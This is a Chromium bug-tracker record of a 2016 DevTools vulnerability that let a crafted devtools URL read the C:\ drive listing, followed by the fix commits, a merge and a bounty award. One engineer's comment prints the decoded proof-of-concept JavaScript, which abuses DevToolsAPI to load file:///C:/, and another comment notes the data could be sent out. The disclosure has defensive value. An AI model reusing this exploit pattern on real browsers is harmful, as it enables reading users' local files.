# Security: chrome-devtools protocol allows to read the content of C:\ drive

| Field | Value |
|-------|-------|
| **Issue ID** | [40085602](https://issues.chromium.org/issues/40085602) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Platform>DevTools |
| **Reporter** | ch...@gmail.com |
| **Assignee** | dg...@chromium.org |
| **Created** | 2016-10-05 |
| **Bounty** | $3,000.00 |

## Description

**VERSION**  

Chrome Version: 55.0.2880.4 canary (64-bit)  

Operating System: Windows 7

**REPRODUCTION CASE**

1. Navigate to the link below.
2. As you can see the page displays the content of C:\ drive.

## Attachments

- [devtools-link.txt](attachments/devtools-link.txt) (text/plain, 1.7 KB)
- [Recording.mp4](attachments/Recording.mp4) (video/mp4, 1022.2 KB)

## Timeline

### el...@chromium.org (2016-10-05)

The repro calls chrome devtools://devtools/remote/serve_rev/@199588/devtools.html?eval(attackcode)

where attack code works out to be:
function f() {c='d="",DevToolsAPI.streamWrite=function(e,o){d+=o},DevToolsAPI.sendMessageToEmbedder("loadNetworkResource",["file:///C:/","",0],function(e){d.split("\\n").map(function(e){e.match(/addRow.*;/)&&document.write(e.match(/addRow.*;/)[0]);})});' ;document.write("<script>window.document.write('<script>'+c+'</scr'+'ipt>');</scr"+"ipt>");}if( typeof DevToolsHost == "undefined" ) location.reload();elsef();

This would be interesting if the data in question could be leaked (e.g. instead of document.writing it in text, it instead sent it to a remote server via XHR).

Level of exploitability depends on whether or not Chrome is willing to navigate to such a link in markup or as the source of an IFRAME or whether the attacker needs to convince the user to navigate to it via the address bar.

[Monorail components: Platform>DevTools]

### ts...@chromium.org (2016-10-05)

Exfiltration seems likely, which would make this severity high.
But it appears to require navigation [It would be a bug in itself if web content could open devtools schemes], dropping to medium.



### me...@chromium.org (2016-10-05)

FWIW it's possible to navigate to chrome-devtools schemes from extensions. This means an extension with no permissions will be able to read disk contents.

### ts...@chromium.org (2016-10-05)

[Empty comment from Monorail migration]

### ts...@chromium.org (2016-10-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-13)

[Empty comment from Monorail migration]

### ch...@gmail.com (2016-10-17)

Any updates on this bug?

### dg...@chromium.org (2016-10-17)

The patch is under review.

### bu...@chromium.org (2016-10-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/f865c2dfddb1d95af3a2467587c62566e3f7dfe4

commit f865c2dfddb1d95af3a2467587c62566e3f7dfe4
Author: dgozman <dgozman@chromium.org>
Date: Mon Oct 17 23:35:31 2016

[DevTools] Move sanitize url to devtools_ui.cc.

Compatibility script is not reliable enough.

BUG=653134

Review-Url: https://codereview.chromium.org/2403633002
Cr-Commit-Position: refs/heads/master@{#425814}

[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/chrome/browser/devtools/devtools_window.cc
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/chrome/browser/ui/webui/devtools_ui.cc
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/chrome/browser/ui/webui/devtools_ui.h
[add] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/chrome/browser/ui/webui/devtools_ui_unittest.cc
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/chrome/test/BUILD.gn
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/content/renderer/devtools/devtools_client.cc
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/third_party/WebKit/Source/devtools/front_end/Runtime.js
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/third_party/WebKit/Source/devtools/front_end/devtools.js
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/third_party/WebKit/Source/devtools/front_end/screencast/ScreencastView.js


### bu...@chromium.org (2016-10-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/f865c2dfddb1d95af3a2467587c62566e3f7dfe4

commit f865c2dfddb1d95af3a2467587c62566e3f7dfe4
Author: dgozman <dgozman@chromium.org>
Date: Mon Oct 17 23:35:31 2016

[DevTools] Move sanitize url to devtools_ui.cc.

Compatibility script is not reliable enough.

BUG=653134

Review-Url: https://codereview.chromium.org/2403633002
Cr-Commit-Position: refs/heads/master@{#425814}

[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/chrome/browser/devtools/devtools_window.cc
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/chrome/browser/ui/webui/devtools_ui.cc
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/chrome/browser/ui/webui/devtools_ui.h
[add] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/chrome/browser/ui/webui/devtools_ui_unittest.cc
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/chrome/test/BUILD.gn
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/content/renderer/devtools/devtools_client.cc
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/third_party/WebKit/Source/devtools/front_end/Runtime.js
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/third_party/WebKit/Source/devtools/front_end/devtools.js
[modify] https://crrev.com/f865c2dfddb1d95af3a2467587c62566e3f7dfe4/third_party/WebKit/Source/devtools/front_end/screencast/ScreencastView.js


### ch...@gmail.com (2016-10-19)

Verified on 56.0.2894.0 (Windows). Fixed.

### dg...@chromium.org (2016-10-24)

Looks like this didn't introduce regressions in canary for a weak. Requesting merge to M55.

### di...@chromium.org (2016-10-24)

Your change meets the bar and is auto-approved for M55 (branch: 2883)

### sh...@chromium.org (2016-10-25)

Please mark security bugs as fixed as soon as the fix lands, and before requesting merges. This update is based on the merge- labels applied to this issue. Please reopen if this update was incorrect.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@chromium.org (2016-10-25)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/528c2bce2ece070826a84392d66169ffe33afdcd

commit 528c2bce2ece070826a84392d66169ffe33afdcd
Author: Dmitry Gozman <dgozman@chromium.org>
Date: Tue Oct 25 18:53:53 2016

Merge to 2883 "[DevTools] Move sanitize url to devtools_ui.cc."
> [DevTools] Move sanitize url to devtools_ui.cc.
>
> Compatibility script is not reliable enough.
>
> BUG=653134
>
> Review-Url: https://codereview.chromium.org/2403633002
> Cr-Commit-Position: refs/heads/master@{#425814}
(cherry picked from commit f865c2dfddb1d95af3a2467587c62566e3f7dfe4)
TBR=pfeldman

Review URL: https://codereview.chromium.org/2444423002 .

Cr-Commit-Position: refs/branch-heads/2883@{#289}
Cr-Branched-From: 614d31daee2f61b0180df403a8ad43f20b9f6dd7-refs/heads/master@{#423768}

[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/chrome/browser/devtools/devtools_window.cc
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/chrome/browser/ui/webui/devtools_ui.cc
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/chrome/browser/ui/webui/devtools_ui.h
[add] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/chrome/browser/ui/webui/devtools_ui_unittest.cc
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/chrome/test/BUILD.gn
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/content/renderer/devtools/devtools_client.cc
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/third_party/WebKit/Source/devtools/front_end/Runtime.js
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/third_party/WebKit/Source/devtools/front_end/devtools.js
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/third_party/WebKit/Source/devtools/front_end/screencast/ScreencastView.js


### sh...@chromium.org (2016-10-26)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-27)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-10-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/528c2bce2ece070826a84392d66169ffe33afdcd

commit 528c2bce2ece070826a84392d66169ffe33afdcd
Author: Dmitry Gozman <dgozman@chromium.org>
Date: Tue Oct 25 18:53:53 2016

Merge to 2883 "[DevTools] Move sanitize url to devtools_ui.cc."
> [DevTools] Move sanitize url to devtools_ui.cc.
>
> Compatibility script is not reliable enough.
>
> BUG=653134
>
> Review-Url: https://codereview.chromium.org/2403633002
> Cr-Commit-Position: refs/heads/master@{#425814}
(cherry picked from commit f865c2dfddb1d95af3a2467587c62566e3f7dfe4)
TBR=pfeldman

Review URL: https://codereview.chromium.org/2444423002 .

Cr-Commit-Position: refs/branch-heads/2883@{#289}
Cr-Branched-From: 614d31daee2f61b0180df403a8ad43f20b9f6dd7-refs/heads/master@{#423768}

[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/chrome/browser/devtools/devtools_window.cc
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/chrome/browser/ui/webui/devtools_ui.cc
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/chrome/browser/ui/webui/devtools_ui.h
[add] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/chrome/browser/ui/webui/devtools_ui_unittest.cc
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/chrome/test/BUILD.gn
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/content/renderer/devtools/devtools_client.cc
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/third_party/WebKit/Source/devtools/front_end/Runtime.js
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/third_party/WebKit/Source/devtools/front_end/devtools.js
[modify] https://crrev.com/528c2bce2ece070826a84392d66169ffe33afdcd/third_party/WebKit/Source/devtools/front_end/screencast/ScreencastView.js


### di...@google.com (2016-11-04)

[Automated comment] removing mislabelled merge-merged-2840

### aw...@chromium.org (2016-11-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-07)

Congratulations, the panel awarded $3,000 for this report!

### aw...@chromium.org (2016-11-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-11-29)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-01-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-01-31)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/653134?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085602)*
